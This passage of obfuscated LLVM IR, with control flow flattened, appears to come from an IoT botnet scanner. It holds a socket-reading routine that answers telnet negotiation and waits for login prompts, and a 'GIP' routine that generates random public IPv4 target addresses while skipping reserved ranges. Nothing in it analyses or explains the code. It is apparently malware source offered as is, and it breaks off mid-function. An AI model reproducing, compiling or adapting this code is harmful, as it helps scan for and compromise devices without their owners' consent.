; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 642313752, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 642313752, label %33
    i32 -1940697015, label %39
    i32 -1830804839, label %44
    i32 978228423, label %48
    i32 -1319726789, label %49
    i32 -1236678476, label %51
    i32 154307851, label %52
    i32 1719680606, label %61
    i32 1986051789, label %78
    i32 -458661813, label %79
    i32 286525534, label %91
    i32 -1159535278, label %95
    i32 726892629, label %96
    i32 -626513868, label %105
    i32 -1156023029, label %114
    i32 -27029149, label %118
    i32 259312339, label %119
    i32 -260529544, label %128
    i32 1546392928, label %129
    i32 -1769710690, label %130
    i32 1432953713, label %136
    i32 258313718, label %140
    i32 1521451792, label %145
    i32 1557545102, label %146
    i32 -1643411857, label %147
    i32 574707779, label %148
    i32 -1866750370, label %152
    i32 -769757861, label %153
    i32 686807900, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -1940697015, i32 -1319726789
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 978228423, i32 -1830804839
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 978228423, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1319726789, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -1236678476, i32 574707779
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 154307851, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #3, !srcloc !5
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 1719680606, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 1986051789, i32 -458661813
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 574707779, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 -1159535278, i32 286525534
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -1159535278, i32 726892629
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 686807900, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 -626513868, i32 -1769710690
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 -27029149, i32 -1156023029
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -27029149, i32 259312339
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 686807900, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 1546392928, i32 -260529544
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 686807900, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 -1643411857, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #9
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 1521451792, i32 1432953713
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 258313718, i32 1557545102
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 1521451792, i32 1557545102
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 574707779, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -1643411857, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 642313752, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 -1866750370, i32 -769757861
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 686807900, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 686807900, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #3
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #3
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #3
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 302883027, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 302883027, label %14
    i32 2021131343, label %19
    i32 326458266, label %24
    i32 142902561, label %29
    i32 717901542, label %34
    i32 -1099722286, label %39
    i32 2084647272, label %44
    i32 -1379084013, label %49
    i32 -1309942438, label %54
    i32 -1283871995, label %59
    i32 1986890670, label %64
    i32 1809037749, label %69
    i32 1320598571, label %74
    i32 538446139, label %79
    i32 -844965367, label %84
    i32 593549954, label %89
    i32 -526604875, label %94
    i32 305949490, label %99
    i32 -1170846938, label %104
    i32 526959911, label %109
    i32 -520940149, label %114
    i32 -1718862698, label %119
    i32 -534865667, label %124
    i32 1326478321, label %129
    i32 -324314701, label %134
    i32 1256678037, label %139
    i32 1128975186, label %144
    i32 1102086625, label %149
    i32 -373150989, label %154
    i32 -1324650115, label %159
    i32 1129599281, label %164
    i32 2112333654, label %169
    i32 -2051990471, label %174
    i32 1079313728, label %179
    i32 52206750, label %184
    i32 42502658, label %189
    i32 -368963253, label %194
    i32 1835297111, label %199
    i32 -805941197, label %204
    i32 1719107441, label %209
    i32 419536999, label %214
    i32 1022195561, label %219
    i32 1633335535, label %224
    i32 1558931973, label %229
    i32 1638248769, label %234
    i32 864093599, label %239
    i32 -1972833115, label %244
    i32 640055272, label %249
    i32 -1384811819, label %254
    i32 -280623510, label %259
    i32 1782090878, label %264
    i32 2074703756, label %269
    i32 333074577, label %274
    i32 303674767, label %279
    i32 1257453889, label %284
    i32 2105916232, label %289
    i32 125412592, label %294
    i32 892462142, label %299
    i32 -2050588493, label %304
    i32 -381868312, label %309
    i32 1807892819, label %314
    i32 -1292338955, label %319
    i32 -1890429477, label %324
    i32 -263714628, label %329
    i32 1953571300, label %334
    i32 1125246097, label %339
    i32 161708964, label %344
    i32 -494132507, label %349
    i32 1812355202, label %354
    i32 -946916086, label %359
    i32 537732672, label %364
    i32 1829786341, label %369
    i32 1503091510, label %374
    i32 -18263661, label %379
    i32 1815506232, label %384
    i32 811086104, label %389
    i32 -641062947, label %394
    i32 699182198, label %399
    i32 -1464010414, label %404
    i32 -2027589454, label %409
    i32 -2104135290, label %414
    i32 390366588, label %419
    i32 572375313, label %424
    i32 -2106750428, label %429
    i32 15618238, label %434
    i32 1865719967, label %439
    i32 -520989690, label %444
    i32 -110825550, label %449
    i32 161238580, label %454
    i32 -1234024120, label %459
    i32 1599269389, label %464
    i32 2025280698, label %469
    i32 -330572017, label %474
    i32 1402995184, label %479
    i32 1469042156, label %484
    i32 -1655201006, label %489
    i32 -749912661, label %494
    i32 1015402428, label %499
    i32 891030878, label %504
    i32 801873504, label %509
    i32 1260455621, label %514
    i32 692133402, label %519
    i32 851821390, label %524
    i32 478360992, label %529
    i32 -104044229, label %534
    i32 252498770, label %539
    i32 826861863, label %544
    i32 -2014930377, label %549
    i32 -1909217886, label %554
    i32 -551178380, label %559
    i32 -1194758572, label %564
    i32 1156520461, label %569
    i32 1800474659, label %574
    i32 2033023949, label %579
    i32 -2104329463, label %584
    i32 1297748714, label %589
    i32 1513714095, label %594
    i32 -1596338059, label %599
    i32 -1702591242, label %604
    i32 1958689371, label %609
    i32 -1660384935, label %614
    i32 -2974131, label %619
    i32 280339978, label %624
    i32 2098146280, label %629
    i32 -20665965, label %634
    i32 -366888452, label %639
    i32 488051728, label %644
    i32 -1889275547, label %649
    i32 1209133015, label %654
    i32 -424809491, label %659
    i32 1379222223, label %664
    i32 -752522440, label %669
    i32 1518259211, label %674
    i32 -39553703, label %679
    i32 -1348598965, label %684
    i32 -1715009964, label %689
    i32 1458312448, label %694
    i32 1117631989, label %699
    i32 1995796683, label %704
    i32 1713895382, label %709
    i32 -598350429, label %714
    i32 1792560133, label %719
    i32 1744172313, label %724
    i32 -625235488, label %729
    i32 644967385, label %734
    i32 901636902, label %739
    i32 1146635507, label %744
    i32 393472850, label %749
    i32 238641228, label %754
    i32 -284442623, label %759
    i32 -185663452, label %764
    i32 1121490258, label %769
    i32 -1389943194, label %774
    i32 1482701350, label %779
    i32 1158863663, label %784
    i32 -869764894, label %789
    i32 -503735345, label %794
    i32 -93949335, label %799
    i32 1814096479, label %804
    i32 -907899977, label %809
    i32 -2005730630, label %814
    i32 797711503, label %819
    i32 2119661045, label %824
    i32 452475251, label %829
    i32 1889062720, label %834
    i32 -339331792, label %839
    i32 57699128, label %844
    i32 1505899833, label %849
    i32 -1051678025, label %854
    i32 -1836461685, label %859
    i32 483346679, label %864
    i32 -1803576170, label %869
    i32 1418912090, label %874
    i32 1686886427, label %879
    i32 852620286, label %884
    i32 557773894, label %889
    i32 1935661226, label %894
    i32 -1018793025, label %899
    i32 622217177, label %904
    i32 3036677, label %909
    i32 1811663536, label %914
    i32 -104494355, label %919
    i32 640248729, label %924
    i32 -97719774, label %929
    i32 -1203364876, label %934
    i32 -332284992, label %939
    i32 1679728761, label %944
    i32 879333532, label %949
    i32 -556160768, label %954
    i32 -709006689, label %959
    i32 -351247443, label %964
    i32 2092503073, label %969
    i32 -2108600264, label %974
    i32 -336980554, label %979
    i32 950017816, label %984
    i32 -375119812, label %989
    i32 599658943, label %994
    i32 207288113, label %999
    i32 -1605503182, label %1004
    i32 -1321601254, label %1009
    i32 693638140, label %1014
    i32 1446857347, label %1019
    i32 -1497423480, label %1024
    i32 1272191185, label %1029
    i32 -1098305148, label %1034
    i32 1662280798, label %1039
    i32 -702877095, label %1044
    i32 -803124016, label %1049
    i32 -2081529102, label %1054
    i32 -906638660, label %1059
    i32 -409506800, label %1064
    i32 -1895296600, label %1069
    i32 1882148725, label %1074
    i32 -621975831, label %1079
    i32 -172875068, label %1084
    i32 760007451, label %1089
    i32 -399230044, label %1094
    i32 -276183338, label %1099
    i32 -159527102, label %1104
    i32 164528589, label %1109
    i32 1471526082, label %1114
    i32 1116925630, label %1119
    i32 1989333209, label %1124
    i32 167507925, label %1129
    i32 665591423, label %1134
    i32 1823039124, label %1139
    i32 -1105476536, label %1144
    i32 1831109670, label %1149
    i32 1196664162, label %1154
    i32 1704474967, label %1159
    i32 -1366470681, label %1164
    i32 826582352, label %1169
    i32 704523582, label %1174
    i32 -718002571, label %1179
    i32 1179099137, label %1184
    i32 1719756255, label %1189
    i32 2044230724, label %1194
    i32 974280072, label %1199
    i32 939071382, label %1204
    i32 586929801, label %1209
    i32 572474937, label %1214
    i32 16455147, label %1219
    i32 -795693239, label %1224
    i32 -1079546181, label %1229
    i32 -575705507, label %1234
    i32 -1404020120, label %1239
    i32 1350142937, label %1244
    i32 1241143418, label %1249
    i32 -2130100258, label %1254
    i32 -1136205511, label %1259
    i32 763334861, label %1264
    i32 -1073291042, label %1269
    i32 -506650699, label %1274
    i32 -736459438, label %1279
    i32 1672134079, label %1284
    i32 1869489416, label %1289
    i32 -1053195439, label %1294
    i32 -277746479, label %1299
    i32 1947631840, label %1304
    i32 1611538484, label %1309
    i32 -1394161578, label %1314
    i32 -1068933444, label %1319
    i32 1175217008, label %1324
    i32 27762033, label %1329
    i32 -1695802251, label %1334
    i32 -1050567120, label %1339
    i32 1637490172, label %1344
    i32 -973450089, label %1349
    i32 1714623169, label %1354
    i32 -1521003293, label %1359
    i32 754555017, label %1364
    i32 -445927035, label %1369
    i32 982214186, label %1374
    i32 311869037, label %1379
    i32 -703041845, label %1384
    i32 199443080, label %1389
    i32 -1913688160, label %1394
    i32 1817495959, label %1399
    i32 1174323419, label %1404
    i32 -2005786399, label %1409
    i32 1553084156, label %1414
    i32 1932968507, label %1419
    i32 -1462469020, label %1424
    i32 1036598195, label %1429
    i32 -571155608, label %1434
    i32 961014986, label %1439
    i32 214972406, label %1444
    i32 112802370, label %1449
    i32 -113167314, label %1454
    i32 -425613596, label %1459
    i32 -810251471, label %1464
    i32 894573310, label %1469
    i32 -715730583, label %1474
    i32 1514329698, label %1479
    i32 1519583503, label %1484
    i32 -1232553874, label %1489
    i32 1282571388, label %1494
    i32 -1922033534, label %1499
    i32 -1794728042, label %1504
    i32 1155506957, label %1509
    i32 -1977391818, label %1514
    i32 234450928, label %1519
    i32 -865486498, label %1524
    i32 817020480, label %1529
    i32 -1854041652, label %1534
    i32 -1095605985, label %1539
    i32 732156049, label %1544
    i32 -1595985938, label %1549
    i32 -344987216, label %1554
    i32 -1856774222, label %1559
    i32 393884121, label %1564
    i32 951260768, label %1569
    i32 -1231632916, label %1574
    i32 2119490849, label %1579
    i32 1647546576, label %1584
    i32 991932887, label %1589
    i32 78032640, label %1594
    i32 596592512, label %1599
    i32 -1787237624, label %1604
    i32 1517155849, label %1609
    i32 -1104261095, label %1614
    i32 1618971496, label %1619
    i32 665034620, label %1624
    i32 1236092398, label %1629
    i32 -970525612, label %1634
    i32 965827442, label %1639
    i32 849741571, label %1644
    i32 -951687549, label %1649
    i32 -1325803585, label %1654
    i32 707950714, label %1659
    i32 357657725, label %1664
    i32 1688748640, label %1669
    i32 2085947030, label %1674
    i32 114392341, label %1679
    i32 882053550, label %1684
    i32 1470146259, label %1689
    i32 -706161736, label %1694
    i32 997716220, label %1699
    i32 1093759215, label %1704
    i32 1790630332, label %1709
    i32 254145420, label %1714
    i32 618572945, label %1719
    i32 -1132867674, label %1724
    i32 1876112926, label %1729
    i32 -1989816328, label %1734
    i32 -2114321038, label %1739
    i32 521427725, label %1744
    i32 660868117, label %1749
    i32 277123946, label %1754
    i32 105281823, label %1759
    i32 -1355045286, label %1764
    i32 -869417784, label %1769
    i32 414685238, label %1774
    i32 497232230, label %1779
    i32 -1387967374, label %1784
    i32 85809710, label %1789
    i32 334138729, label %1794
    i32 1128617147, label %1799
    i32 -942272044, label %1804
    i32 -1773652159, label %1809
    i32 -1391954405, label %1814
    i32 886699317, label %1819
    i32 1095827156, label %1824
    i32 743599844, label %1829
    i32 -1568015878, label %1834
    i32 -127776463, label %1839
    i32 2037171048, label %1844
    i32 684195860, label %1849
    i32 928957803, label %1854
    i32 387359047, label %1859
    i32 1945766317, label %1864
    i32 1848862925, label %1869
    i32 -315986008, label %1874
    i32 -1090452901, label %1879
    i32 -1335856351, label %1884
    i32 -769758214, label %1889
    i32 1342280244, label %1894
    i32 822502802, label %1899
    i32 279691605, label %1904
    i32 280382638, label %1909
    i32 -1430947651, label %1914
    i32 -916204273, label %1919
    i32 -1138331224, label %1924
    i32 2040833982, label %1929
    i32 2082760968, label %1934
    i32 621190096, label %1939
    i32 -1526004572, label %1944
    i32 -1369859667, label %1949
    i32 1088260751, label %1954
    i32 -1319598955, label %1959
    i32 -859478568, label %1964
    i32 -560512373, label %1969
    i32 1547411949, label %1974
    i32 -2046362501, label %1979
    i32 336215145, label %1984
    i32 -2096696286, label %1989
    i32 1253658509, label %1994
    i32 -1464603676, label %1999
    i32 -1671336560, label %2004
    i32 -316901977, label %2009
    i32 1138863375, label %2014
    i32 40013815, label %2019
    i32 -1026474557, label %2024
    i32 -961045029, label %2029
    i32 -494987197, label %2034
    i32 1051315666, label %2039
    i32 -164213280, label %2044
    i32 -1855318373, label %2049
    i32 -687760680, label %2054
    i32 351864242, label %2059
    i32 198448835, label %2064
    i32 2086512643, label %2069
    i32 58425766, label %2074
    i32 312852289, label %2079
    i32 -233573159, label %2084
    i32 -765467400, label %2089
    i32 824125512, label %2094
    i32 -1718162908, label %2099
    i32 -1598665944, label %2104
    i32 415828740, label %2109
    i32 886558934, label %2114
    i32 -953258825, label %2119
    i32 697164451, label %2124
    i32 -821218005, label %2129
    i32 1345875939, label %2134
    i32 1642104857, label %2139
    i32 452285870, label %2144
    i32 -426157543, label %2149
    i32 1151130122, label %2154
    i32 812031690, label %2159
    i32 -1858597552, label %2164
    i32 -1629449666, label %2169
    i32 -1520113927, label %2174
    i32 149669947, label %2179
    i32 -692438327, label %2184
    i32 -1352566543, label %2189
    i32 -1709575324, label %2194
    i32 -637680752, label %2199
    i32 -307885581, label %2204
    i32 -1956397490, label %2209
    i32 -154898981, label %2214
    i32 1749448883, label %2219
    i32 734024117, label %2224
    i32 -1458352109, label %2229
    i32 -1851152517, label %2234
    i32 -1036516916, label %2239
    i32 -424130850, label %2244
    i32 -576719139, label %2249
    i32 -1139845630, label %2254
    i32 1306016614, label %2259
    i32 -775341511, label %2264
    i32 1489199153, label %2269
    i32 1122834721, label %2274
    i32 -1566293022, label %2279
    i32 -368853556, label %2284
    i32 110880539, label %2289
    i32 -36928924, label %2294
    i32 -310770177, label %2299
    i32 202572945, label %2304
    i32 864576573, label %2309
    i32 -1652816886, label %2314
    i32 -1662975599, label %2319
    i32 -831558302, label %2324
    i32 1294066239, label %2329
    i32 -1189972386, label %2334
    i32 1734645424, label %2339
    i32 620971724, label %2344
    i32 -1679087805, label %2349
    i32 688684500, label %2354
    i32 -671939388, label %2359
    i32 1563577426, label %2364
    i32 -871178343, label %2369
    i32 -14759144, label %2374
    i32 -408051415, label %2379
    i32 -1033079530, label %2384
    i32 1873464532, label %2389
    i32 1570502464, label %2394
    i32 372001653, label %2399
    i32 557600469, label %2404
    i32 1487382235, label %2409
    i32 -899709554, label %2414
    i32 1235347144, label %2419
    i32 1223749332, label %2424
    i32 1145570930, label %2429
    i32 -421791338, label %2434
    i32 161312886, label %2439
    i32 1793445915, label %2444
    i32 -278089533, label %2449
    i32 -2094326374, label %2454
    i32 -1379062799, label %2459
    i32 889109923, label %2464
    i32 -958902188, label %2469
    i32 -295072484, label %2474
    i32 1467381991, label %2479
    i32 1832977605, label %2484
    i32 1744437577, label %2489
    i32 -1593532198, label %2494
    i32 -2125388429, label %2499
    i32 2093282699, label %2504
    i32 503490593, label %2509
    i32 -476099999, label %2514
    i32 1727631856, label %2519
    i32 -645156040, label %2524
    i32 -709315540, label %2529
    i32 1540617536, label %2534
    i32 -308375336, label %2539
    i32 -1670283322, label %2544
    i32 1361473790, label %2549
    i32 1216153447, label %2554
    i32 -776818780, label %2559
    i32 692540013, label %2564
    i32 1468267867, label %2569
    i32 -334867433, label %2574
    i32 748534843, label %2579
    i32 -784526, label %2584
    i32 917620503, label %2589
    i32 -1947700347, label %2594
    i32 118837071, label %2599
    i32 224742561, label %2604
    i32 -1081621604, label %2609
    i32 -954006747, label %2614
    i32 -1083379702, label %2619
    i32 -1819624574, label %2624
    i32 -816428847, label %2629
    i32 -126472694, label %2634
    i32 -1064830578, label %2639
    i32 1172573812, label %2644
    i32 -397644298, label %2649
    i32 -1336582622, label %2654
    i32 -651858032, label %2659
    i32 22166668, label %2664
    i32 -485533958, label %2669
    i32 793535602, label %2674
    i32 450276939, label %2679
    i32 1660161949, label %2684
    i32 283365419, label %2689
    i32 -106572179, label %2694
    i32 558545936, label %2699
    i32 1206132446, label %2704
    i32 -1764585213, label %2709
    i32 -2086023915, label %2714
    i32 1457474226, label %2719
    i32 -2093147312, label %2724
    i32 1223764169, label %2729
    i32 -116119570, label %2734
    i32 -1843648117, label %2739
    i32 -1855743470, label %2744
    i32 -2016354658, label %2749
    i32 -140130423, label %2754
    i32 1671714500, label %2759
    i32 -875687168, label %2764
    i32 -1740016007, label %2769
    i32 -366768826, label %2774
    i32 686100670, label %2779
    i32 -1119245971, label %2784
    i32 -356511356, label %2789
    i32 692265457, label %2794
    i32 -584388925, label %2799
    i32 1205514714, label %2804
    i32 2086569993, label %2809
    i32 1972723761, label %2814
    i32 -25759592, label %2819
    i32 -148843199, label %2824
    i32 1820069632, label %2829
    i32 1838710244, label %2834
    i32 -1277860195, label %2839
    i32 2887051, label %2844
    i32 -714299684, label %2849
    i32 -665935141, label %2854
    i32 1196575377, label %2859
    i32 514470986, label %2864
    i32 1673919261, label %2869
    i32 -455889164, label %2874
    i32 138132169, label %2879
    i32 -449883600, label %2884
    i32 -1976371163, label %2889
    i32 -1869008753, label %2894
    i32 -1813357520, label %2898
    i32 485985608, label %2900
    i32 -1365661370, label %2913
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  %18 = select i1 %17, i32 -1813357520, i32 2021131343
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 0
  %23 = select i1 %22, i32 -1813357520, i32 326458266
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 3
  %28 = select i1 %27, i32 -1813357520, i32 142902561
  store i32 %28, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 15
  %33 = select i1 %32, i32 -1813357520, i32 717901542
  store i32 %33, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
